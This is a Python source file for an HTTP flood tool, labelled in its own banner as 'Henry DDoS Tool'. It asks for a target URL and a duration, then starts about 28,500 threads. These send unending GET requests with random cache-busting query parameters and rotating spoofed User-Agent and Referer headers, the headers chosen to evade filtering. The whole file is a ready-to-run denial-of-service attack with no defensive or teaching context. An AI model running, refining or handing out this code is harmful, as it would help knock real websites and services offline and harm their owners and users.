import requests
import threading
import random
import time
import os
from urllib.parse import urlparse
import psutil

__version__ = "1.0.1"
accept_charset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

headers_referers = [
    "http://www.google.com/?q=",
    "http://www.usatoday.com/search/results?q=",
    "http://engadget.search.aol.com/search?q=",
]

headers_useragents = [
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
    "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
    "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.37",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.37",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5115.170 Safari/537.36 Edg/101.0.1202.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.0 Safari/537.36 Edg/105.0.1296.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4881.178 Safari/537.36 Edg/98.0.1108.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5111.0 Safari/537.36 Edg/104.0.1290.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4881.196 Safari/537.36 Edg/95.0.1020.30",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/98.0.1108.62",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.0 Safari/537.36 Edg/104.0.1293.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.32",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.0 Safari/537.36 Edg/104.0.1293.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36 Edg/102.0.1245.44",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5098.136 Safari/537.36 Edg/99.0.1208.24",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Safari/537.36 Edg/102.0.1245.71",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:107.0) Gecko/20110101 Firefox/107.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20110101 Firefox/100.0",
     "Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:100.0) Gecko/20061419 Firefox/100.0",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:100.0) Gecko/20000101 Firefox/100.0",
     "Mozilla/5.0 (X11; Linux x86_64) Gecko/20162914 Firefox/100.0",
     "Mozilla/5.0 (X11; U; Linux x86_64) Gecko/20000604 Firefox/100.0",
      "Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:100.0) Gecko/20071101 Firefox/100.0",
      "Mozilla/5.0 (X11; Linux x86_64:100.0) Gecko/20100101 Firefox/100.0",
      "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:100.0) Gecko/20012119 Firefox/100.0",
     "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.91 Safari/537.36 OPR/44.0.2276.288",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.4126.146 Safari/537.36 OPR/54.0.4177.46",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.4123.146 Safari/537.36 OPR/53.0.4054.46",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4892.119 Safari/537.36 OPR/85.0.4341.72",
      "Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5150.115 Safari/537.36 OPR/80.0.3637.162",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4870.168 Safari/537.36 OPR/78.0.3351.71",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36 OPR/85.0.4341.18",
      "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.5126.171 Safari/537.36 OPR/79.0.2378.171",
      "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5041.151 Safari/537.36 OPR/82.0.4117.142",
      "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40",
      "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.58",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4930.0 Safari/537.36 OPR/83.0.4254.27",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/102.0.5005.61 Safari/537.36 OPR/88.0.4412.27",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4862.113 Safari/537.36 OPR/85.0.4341.60",
      "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40",
      
]

cur = 0
request_success = 0
request_error = 0
safe = False
target = ""

def build_block(size):
    return ''.join(chr(random.randint(65, 90)) for _ in range(size))

def http_call(url, headers):
    global cur, request_success, request_error, safe
    parsed_url = urlparse(url)
    param_joiner = '&' if '?' in url else '?'
    client = requests.Session()

    while True:
        try:
            q_url = url + param_joiner + build_block(random.randint(3, 10)) + "=" + build_block(random.randint(3, 10))
            user_agent = random.choice(headers_useragents)
            referer = random.choice(headers_referers) + build_block(random.randint(5, 10))

            headers.update({
                "User-Agent": user_agent,
                "Cache-Control": "no-cache",
                "Accept-Charset": accept_charset,
                "Referer": referer,
                "Keep-Alive": str(random.randint(100, 110)),
                "Connection": "keep-alive",
                "Host": parsed_url.netloc
            })

            response = client.get(q_url, headers=headers, timeout=5)
            cur += 1
            request_success += 1

            if safe and response.status_code >= 500:
                break

        except requests.exceptions.RequestException:
            request_error += 1

        time.sleep(0.001)

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""
    ========================================
    |         Henry DDoS Tool v1.0.1       |
    |           Cre By @HaiBe              |
    ========================================
    """)

def worker_threads():
    global target
    headers = {}

    for _ in range(30):
        threading.Thread(target=thread_worker, args=(target, headers)).start()
        time.sleep(0.1)

def thread_worker(target, headers):
    threads = []
    for _ in range(950):
        t = threading.Thread(target=http_call, args=(target, headers))
        t.daemon = True
        threads.append(t)

    for t in threads:
        t.start()

def main():
    global target, cur, request_success, request_error
    banner()
    target = input("Input Target: ")
    duration = int(input("Enter Duration: "))
    start_time = time.time()
    worker_threads()

    try:
        while time.time() - start_time < duration:
            time.sleep(1)
            cpu_usage = psutil.cpu_percent(interval=1)
            print(f"\rCpu: {cpu_usage}% | Successfully Requests: {request_success} | Error Requests: {request_error}", end="")

        print("\nAttack Stop | (y) To Back Home . (n) Exit")
        choice = input().strip().lower()

        if choice == 'y':
            cur = 0
            request_success = 0
            request_error = 0
            main()
        elif choice == 'n':
            print("Exiting...")
            os._exit(0)

    except KeyboardInterrupt:
        print("\nAttack Stop | (y) To Back Home . (n) Exit")
        choice = input().strip().lower()

        if choice == 'y':
            cur = 0
            request_success = 0
            request_error = 0
            main()
        elif choice == 'n':
            print("Exiting...")
            os._exit(0)

if __name__ == "__main__":
    main()
    